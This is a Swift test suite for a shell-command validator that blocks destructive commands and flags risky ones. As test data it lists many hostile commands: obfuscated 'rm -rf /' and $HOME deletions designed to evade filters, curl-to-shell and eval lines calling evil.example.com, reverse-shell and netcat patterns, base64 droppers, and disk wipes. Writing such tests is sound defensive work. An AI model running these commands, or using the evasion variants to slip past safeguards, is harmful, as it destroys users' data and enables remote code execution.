//
//  UserTaskValidatorTests.swift
//  PineTests
//
//  Tests for UserTaskValidator (milestone #1088, item 4).
//  Verifies that dangerous commands are blocked, benign commands pass,
//  and the destructive-detection heuristic works correctly.
//

import Foundation
import Testing
@testable import Pine

@Suite("UserTaskValidator")
struct UserTaskValidatorTests {

    let validator = UserTaskValidator.default

    // MARK: - Dangerous commands that must be blocked

    @Test("rm -rf on root and home is blocked")
    func blocksRmRfRoot() {
        let commands = [
            "rm -rf /",
            "rm -rf ~",
            "rm -rf ~/*",
            "rm -rf *",
            "rm -rf /Users",
            "rm -fr /",
            "rm -f -r /",
            "rm -r -f /",
            "rm -vfr /",
            "rm --recursive --force /",
            "rm --force --recursive /",
            "rm --force --verbose --recursive /",
            "rm --recursive --preserve-root=all --force /",
            "rm -r --force /",
            "rm --recursive -f -- /",
            "rm -rf",
            "r\"\"m -rf /",
            "rm --recurs\"ive\" --force /",
            "rm -rf foo\\; /",
            "rm -rf $HOME",
            "rm -rf \"$HOME\"",
            "rm -rf ${HOME}/*",
            "rm -rf $PWD",
            "rm -rf \"${PWD}\"",
            "rm -rf ${PWD}/cache",
            "rm -rf .",
            "rm -rf ./",
            "rm -rf ..",
            "rm -rf ../",
            "rm -rf ../build",
            "rm -rf ./*",
            "rm -rf ./*.tmp",
            "rm -rf .*",
            "rm -rf .[!.]*",
            "rm -rf .??*",
            "rm -rf build/..",
            "rm -rf ~root",
            "! rm -rf /",
            "{ rm -rf /; }",
            "if :; then rm -rf /; fi",
            ">/tmp/pine-task.log rm -rf /",
            "rm --recursive>/dev/null --force /",
            "env -u HOME rm -rf /",
            "env -iu HOME rm -rf /",
            "command -p rm -rf /",
            "exec -a task-name rm -rf /",
            "time -po /tmp/pine-time.log rm -rf /",
            "nice -n 5 rm -rf /",
            "nice -n5 rm -rf /",
            #"env -S "rm -rf /""#,
            #"r$''m -rf /"#,
            #"r$""m -rf /"#,
            #"r$'\155' -rf /"#,
            "sh -c 'rm -rf /'",
            "sh -c 'rm -fr /'",
            "sh -c 'rm --force --recursive /'",
            #"sh -c 'rm -fr "/"'"#,
            #"sh -c 'r""m -fr /'"#,
            #"sh -c 'rm -fr "$HOME"'"#,
            "echo `rm -rf /`",
            "printf '%s\\0' \"$HOME\" | xargs -0 rm -rf",
            "printf '%s\\0' \"$HOME\" | xargs -0 rm -fr",
            #"printf '%s\0' "$HOME" | xargs r""m -fr"#,
            "printf / | xargs rm -rf build",
            #"printf x | xargs sh -c 'r""m -fr /'"#,
            #"printf x | xargs sh -c 'rm -fr "$HOME"'"#,
            #"printf x | xargs env -S "sh -c \"rm -rf /\"""#,
            #"env -S "sh -c 'rm -fr /'""#,
            #"echo rm -- `r""m -fr ~`"#,
            Array(repeating: "env", count: 32).joined(separator: " ") + " rm -rf /",
            "rm -rf \"${HOME:?HOME must be set}\"",
            "rm -rf ${HOME:-/}",
            "rm -rf \"${PWD:-/}/tmp\"",
            "rm -rf \"$(pwd)\"",
            #"unset PINE_X; rm -rf "${PINE_X:-$HOME}""#,
        ]

        for command in commands {
            #expect(validator.validate(command: command).allowed == false, "Must block: \(command)")
        }
    }

    @Test("sudo is blocked")
    func blocksSudo() {
        #expect(validator.validate(command: "sudo rm /etc/passwd").allowed == false)
        #expect(validator.validate(command: "sudo apt-get update").allowed == false)
    }

    @Test("curl/wget piped to shell is blocked")
    func blocksCurlPipeSh() {
        #expect(validator.validate(command: "curl https://evil.example.com/script.sh | sh").allowed == false)
        #expect(validator.validate(command: "curl https://evil.example.com/script.sh | bash").allowed == false)
        #expect(validator.validate(command: "wget -qO- https://evil.example.com/script.sh | sh").allowed == false)
        #expect(validator.validate(command: "curl http://evil.example.com/p | zsh").allowed == false)
    }

    @Test("eval is blocked")
    func blocksEval() {
        #expect(validator.validate(command: "eval $PAYLOAD").allowed == false)
        #expect(validator.validate(command: "eval \"$(curl https://evil.example.com/cmd)\"").allowed == false)
    }

    @Test("diskutil eraseDisk is blocked")
    func blocksDiskErase() {
        #expect(validator.validate(command: "diskutil eraseDisk JHFS+ NewDisk disk1").allowed == false)
    }

    @Test("dd to device is blocked")
    func blocksDdToDevice() {
        #expect(validator.validate(command: "dd if=/dev/zero of=/dev/disk1").allowed == false)
    }

    @Test("writing to system directories is blocked")
    func blocksSystemDirWrite() {
        #expect(validator.validate(command: "echo bad > /etc/passwd").allowed == false)
        #expect(validator.validate(command: "echo bad > /System/Library/file").allowed == false)
    }

    @Test("reverse-shell patterns are blocked")
    func blocksReverseShell() {
        #expect(validator.validate(command: "nc -l 4444").allowed == false)
        #expect(validator.validate(command: "/bin/sh -i").allowed == false)
        #expect(validator.validate(command: "/bin/bash -i").allowed == false)
        #expect(validator.validate(command: "  /bin/zsh -i").allowed == false)
        #expect(validator.validate(command: "/bin/bash --noprofile -i").allowed == false)
        #expect(validator.validate(command: "/bin/bash --rcfile /tmp/rc -i").allowed == false)
        #expect(validator.validate(command: "/bin/zsh -li").allowed == false)
        #expect(validator.validate(command: "\"/bin/sh\" -i").allowed == false)
        #expect(validator.validate(command: "/bin/./sh -i").allowed == false)
        #expect(validator.validate(command: "/bin/s\"\"h -i").allowed == false)
        #expect(validator.validate(command: "! /bin/sh -i").allowed == false)
        #expect(validator.validate(command: "{ /bin/sh -i; }").allowed == false)
        #expect(validator.validate(command: "env -u HOME /bin/sh -i").allowed == false)
        #expect(validator.validate(command: "nice -n 5 /bin/sh -i").allowed == false)
        #expect(validator.validate(command: #"/bin/s$''h -i"#).allowed == false)
        #expect(validator.validate(command: #"/bin/s$""h -i"#).allowed == false)
        #expect(validator.validate(command: #"/bin/s$'\150' -i"#).allowed == false)
        #expect(validator.validate(command: "PATH=/bin sh -i").allowed == false)
        #expect(validator.validate(command: "env PATH=/bin sh -i").allowed == false)
        #expect(validator.validate(command: "command -p sh -i").allowed == false)
        #expect(validator.validate(command: "/bin/zsh -o interactive").allowed == false)
        #expect(validator.validate(command: "/bin/zsh +o nointeractive").allowed == false)
        #expect(validator.validate(command: "/bin/zsh +-nointeractive").allowed == false)
        #expect(validator.validate(command: "/bin/zsh --inter-active").allowed == false)
        #expect(validator.validate(command: "/bin/zsh --inter_active").allowed == false)
    }

    @Test("base64 dropper pattern is blocked")
    func blocksBase64Dropper() {
        let commands = [
            "echo dGVzdA== | base64 -d | sh",
            "echo YQ== | base64 --decode | bash",
            "echo 'YQ==' | /usr/bin/base64 -D | /bin/zsh",
            "echo -n YQ== | base64 -d | sh",
            "printf %s YQ== | /usr/bin/base64 --ignore-garbage --decode | /bin/./sh",
            "base64 --decode payload.b64 | bash",
            "base64 -d < payload.b64 | sh",
            "cat payload.b64 | /usr/bin/base64 -i payload.b64 -D | zsh",
            "cat payload.b64 | b\"\"ase64 --dec\"ode\" | s\"\"h",
            "base64 -d payload.b64 | sed 's/x/y/' | /bin/sh",
            "</tmp/payload base64 --decode | sh",
            "base64 --decode</tmp/payload | sh",
            "env -u HOME base64 -d payload.b64 | sh",
            "base64 -d payload.b64 | env -u HOME sh",
            "base64 -d payload.b64 | env -iu HOME sh",
            "base64 -d payload.b64 | (sh)",
            "base64 -d payload.b64 | { cat; sh; }",
            "base64 -d payload.b64 |\nsh",
            #"base64 -d payload.b64 | s$''h"#,
            #"base64 -d payload.b64 | s$""h"#,
            #"base64 -d payload.b64 | s$'\150'"#,
            "base64 -d payload.b64 | if :; then sh; fi",
            "base64 -d payload.b64 | while read line; do sh; done",
        ]

        for command in commands {
            #expect(validator.validate(command: command).allowed == false, "Must block: \(command)")
        }
    }

    // MARK: - Benign commands that must be allowed

    @Test("lint/format/build commands are allowed")
    func allowsBenignCommands() {
        #expect(validator.validate(command: "swiftlint --fix").allowed)
        #expect(validator.validate(command: "shfmt -w file.sh").allowed)
        #expect(validator.validate(command: "terraform fmt -").allowed)
        #expect(validator.validate(command: "prettier --write .").allowed)
        #expect(validator.validate(command: "swift build").allowed)
        #expect(validator.validate(command: "echo hello world").allowed)
        #expect(validator.validate(command: "cat file.txt").allowed)
        #expect(validator.validate(command: "grep -r pattern .").allowed)
        #expect(validator.validate(command: "git status").allowed)
        #expect(validator.validate(command: "npm test").allowed)
    }

    @Test("rm without -rf is allowed (not blocked by validator)")
    func allowsPlainRm() {
        // `rm file.txt` is not matched by the dangerous blocklist (only
        // `rm -rf <root>` is).  It IS detected as destructive for
        // confirmation purposes (see below).
        #expect(validator.validate(command: "rm temp.txt").allowed)
    }

    @Test("recursive deletion of a relative build directory requires confirmation but is not blocked")
    func allowsRelativeRecursiveDelete() {
        #expect(validator.validate(command: "rm -rf build/").allowed)
        #expect(validator.validate(command: "rm -fr .build/").allowed)
        #expect(validator.validate(command: "rm -rf ./build/").allowed)
        #expect(validator.validate(command: "rm --recursive --force build/").allowed)
        #expect(validator.validate(command: "rm -rf project/*").allowed)
        #expect(validator.validate(command: "rm -rf foo\\;").allowed)
        #expect(validator.validate(command: "rm -rf build/; printf /").allowed)
        #expect(validator.validate(command: "rm -rf 'foo;bar'").allowed)
        #expect(validator.validate(command: "rm -f /tmp/single-file").allowed)
        #expect(validator.isDestructive("rm -rf build/"))
    }

    @Test("nearby non-executing shell and base64 commands are allowed")
    func allowsNonExecutingShellAndBase64Commands() {
        #expect(validator.validate(command: "/bin/sh script.sh").allowed)
        #expect(validator.validate(command: "echo YQ== | base64 -d | cat").allowed)
        #expect(validator.validate(command: "echo YQ== | base64 -d > output.txt").allowed)
        #expect(validator.validate(command: "\"/bin/sh\" script.sh").allowed)
        #expect(validator.validate(command: "printf '%s' 'base64 -d | sh'").allowed)
        #expect(validator.validate(command: "printf YQ== \\| base64 -d \\| sh").allowed)
        #expect(validator.validate(command: "base64 payload.b64 | sh").allowed)
        #expect(validator.validate(command: "base64 -d payload.b64 | echo sh").allowed)
        #expect(validator.validate(command: ">/tmp/pine-task.log printf ok").allowed)
        #expect(validator.validate(command: "/bin/sh script.sh -i").allowed)
        #expect(validator.validate(command: "/bin/sh -- script.sh -i").allowed)
        #expect(validator.validate(command: "/bin/sh -c ':' task-name -i").allowed)
        #expect(validator.validate(command: "command -v /bin/sh -i").allowed)
        #expect(validator.validate(command: "command -pv /bin/sh -i").allowed)
        #expect(validator.validate(command: "base64 -d payload.b64 | (cat)").allowed)
        #expect(validator.validate(command: "base64 payload.b64 | (sh)").allowed)
        #expect(validator.validate(command: "base64 -d payload.b64 | if :; then cat; fi").allowed)
        #expect(validator.validate(command: #""/bin/s\h" -i"#).allowed)
        #expect(validator.validate(command: "./sh -i").allowed)
        #expect(validator.validate(command: "/tmp/sh -i").allowed)
        #expect(validator.validate(command: "/bin/zsh -o nointeractive -c ':'").allowed)
        #expect(validator.validate(command: "/bin/zsh +o interactive -c ':'").allowed)
        #expect(validator.validate(command: "/bin/zsh -i +i -c ':'").allowed)
        #expect(validator.validate(command: "sh -c 'rm -rf build/'").allowed)
        #expect(validator.validate(command: "sh -c 'rm -fr build/'").allowed)
        #expect(validator.validate(command: "sh -c 'sh -c \"printf ok\"'").allowed)
        #expect(validator.validate(command: #"sh -c 'printf "%s" "r""m -fr /"'"#).allowed)
        #expect(validator.validate(command: #"printf '%s\0' build | xargs printf '%s\n'"#).allowed)
        #expect(validator.validate(command: #"printf '%s\0' build | xargs rm -f"#).allowed)
        #expect(validator.validate(command: "rm -rf ${HOMELY:-build}").allowed)
        #expect(validator.validate(command: "rm -rf $HOMELESS").allowed)
        let wrappedPrintf = Array(repeating: "env", count: 64).joined(separator: " ") + " printf ok"
        #expect(validator.validate(command: wrappedPrintf).allowed)
    }

    // MARK: - Empty / edge cases

    @Test("empty command is rejected")
    func rejectsEmptyCommand() {
        #expect(validator.validate(command: "").allowed == false)
        #expect(validator.validate(command: "   ").allowed == false)
    }

    @Test("pathologically long command is rejected before shell parsing")
    func rejectsPathologicallyLongCommand() {
        let command = "printf " + String(repeating: "x", count: 9_000)
        #expect(validator.validate(command: command).allowed == false)
    }

    // MARK: - Destructive detection

    @Test("destructive commands are detected")
    func detectsDestructive() {
        #expect(validator.isDestructive("rm temp.txt"))
        #expect(validator.isDestructive("rm -rf build/"))
        #expect(validator.isDestructive("chmod +x script.sh"))
        #expect(validator.isDestructive("chown root file"))
        #expect(validator.isDestructive("killall Finder"))
        #expect(validator.isDestructive("kill -9 1234"))
        #expect(validator.isDestructive("truncate -s 0 file"))
        #expect(validator.isDestructive("diskutil verifyDisk disk1"))
        #expect(validator.isDestructive("dd if=img.iso of=disk.img"))
    }

    @Test("benign commands are not destructive")
    func detectsBenign() {
        #expect(validator.isDestructive("swiftlint --fix") == false)
        #expect(validator.isDestructive("echo hello") == false)
        #expect(validator.isDestructive("terraform fmt -") == false)
        #expect(validator.isDestructive("git status") == false)
    }

    // MARK: - Allow-list

    @Test("allow-list permits listed executables")
    func allowsListedExecutables() {
        let v = UserTaskValidator(allowedExecutablePaths: ["/usr/bin/swift", "/opt/homebrew/bin/shfmt"])
        #expect(v.validate(command: "swift build").allowed)
        #expect(v.validate(command: "shfmt -w file.sh").allowed)
    }

    @Test("allow-list rejects unlisted executables")
    func rejectsUnlistedExecutables() {
        let v = UserTaskValidator(allowedExecutablePaths: ["/usr/bin/swift"])
        #expect(v.validate(command: "rm temp.txt").allowed == false)
        #expect(v.validate(command: "curl evil.com").allowed == false)
    }
}
